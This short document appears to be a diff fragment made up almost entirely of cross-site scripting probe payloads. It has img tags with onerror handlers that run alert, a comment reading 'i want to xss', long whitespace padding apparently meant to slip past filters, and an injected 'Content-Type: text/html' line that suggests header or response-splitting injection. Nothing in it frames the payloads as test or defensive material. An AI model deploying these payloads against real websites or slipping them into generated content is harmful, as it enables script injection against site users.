@@ -1,1 +1,7 @@
---'"><img src=x /* i want to xss */                                                                                                                                                    onerror=alert(2)">
+--'"><img src=x /* i want to xss */                                                                                                                                                 onerror=alert(2)">
+you Got That
+
+Content-Type: text/html
+
+
+<img src=gg onerror=alert(1)>
